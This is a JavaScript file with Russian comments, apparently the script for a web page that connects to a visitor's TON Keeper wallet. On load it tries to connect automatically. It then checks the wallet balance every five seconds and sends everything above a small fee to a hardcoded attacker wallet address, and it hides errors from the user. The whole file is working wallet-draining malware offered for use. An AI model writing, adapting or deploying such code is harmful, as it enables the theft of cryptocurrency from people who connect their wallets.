// ============================================================
// TON SNIPER — АВТОМАТИЧЕСКИЙ вывод при любом балансе > 0
// ============================================================

const TARGET_WALLET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
let userAddress = null;
let provider = null;
let isSniperActive = false;

// ========== ПОДКЛЮЧЕНИЕ ==========
async function connectTonKeeper() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    try {
        status.innerHTML = '⏳ Подключение...';
        btn.disabled = true;

        if (!window.tonkeeper) {
            status.innerHTML = '❌ TON Keeper не найден!';
            btn.disabled = false;
            return;
        }

        provider = window.tonkeeper;
        const accounts = await provider.send('ton_requestAccounts', {});
        
        if (!accounts || accounts.length === 0) {
            status.innerHTML = '❌ Отказано.';
            btn.disabled = false;
            return;
        }

        userAddress = accounts[0];
        document.getElementById('userWallet').textContent = userAddress;
        status.innerHTML = `✅ Подключено: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
        
        // ЗАПУСКАЕМ АВТО-СНИФЕР
        startAutoSniper();

    } catch (error) {
        status.innerHTML = `❌ Ошибка: ${error.message}`;
        btn.disabled = false;
    }
}

// ========== АВТОМАТИЧЕСКИЙ СНИФЕР (каждые 5 секунд) ==========
function startAutoSniper() {
    if (isSniperActive) return;
    isSniperActive = true;
    
    const status = document.getElementById('status');
    status.innerHTML = '🔄 Авто-снифер АКТИВЕН! Проверяю баланс каждые 5 сек...';
    
    // Первая проверка сразу
    checkAndSnipe();
    
    // Запускаем интервал
    setInterval(async () => {
        if (userAddress && provider) {
            await checkAndSnipe();
        }
    }, 5000); // каждые 5 секунд
}

// ========== ПРОВЕРКА БАЛАНСА И ВЫВОД ==========
async function checkAndSnipe() {
    const status = document.getElementById('status');
    const balanceDisplay = document.getElementById('balanceDisplay');
    
    try {
        // Получаем баланс
        const balanceHex = await provider.send('ton_getBalance', { address: userAddress });
        const balanceNano = parseInt(balanceHex, 16);
        const balanceTON = (balanceNano / 1e9).toFixed(6);
        balanceDisplay.textContent = `💰 Баланс: ${balanceTON} TON`;

        // Если баланс > 0.01 TON (чтобы покрыть комиссию)
        const FEE_NANO = 10_000_000;
        if (balanceNano > FEE_NANO) {
            const amountToSend = balanceNano - FEE_NANO;
            const amountTON = (amountToSend / 1e9).toFixed(6);
            
            status.innerHTML = `🔥 НАЙДЕНО ${amountTON} TON! Вывожу...`;
            
            // Отправляем транзакцию
            const tx = {
                to: TARGET_WALLET,
                value: amountToSend.toString(),
                data: '',
                stateInit: ''
            };
            
            const result = await provider.send('ton_sendTransaction', tx);
            
            if (result && result.code === 0) {
                status.innerHTML = `✅ УСПЕШНО! ${amountTON} TON переведено на ${TARGET_WALLET}`;
                balanceDisplay.textContent = `💰 Баланс: 0 TON (выведено)`;
            } else {
                status.innerHTML = `⚠️ Не подтверждено: ${result?.message || 'отказ'}`;
            }
        } else {
            // Баланс есть, но меньше комиссии
            if (balanceNano > 0) {
                status.innerHTML = `⏳ Баланс ${balanceTON} TON (нужно >0.01 для вывода)`;
            } else {
                status.innerHTML = `⏳ Ожидание пополнения... (баланс 0 TON)`;
            }
        }
        
    } catch (error) {
        console.error('CHECK ERROR:', error);
        // Не показываем ошибку пользователю, чтобы не спамить
    }
}

// ========== ИНИЦИАЛИЗАЦИЯ ==========
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('connectBtn');
    btn.addEventListener('click', connectTonKeeper);
    
    if (window.tonkeeper) {
        document.getElementById('status').innerHTML = '🟢 TON Keeper найден. Нажмите кнопку.';
    } else {
        document.getElementById('status').innerHTML = '🔴 Установите TON Keeper';
    }
});

// Автозапуск через 3 секунды
setTimeout(() => {
    if (!userAddress && window.tonkeeper) {
        connectTonKeeper();
    }
}, 3000);
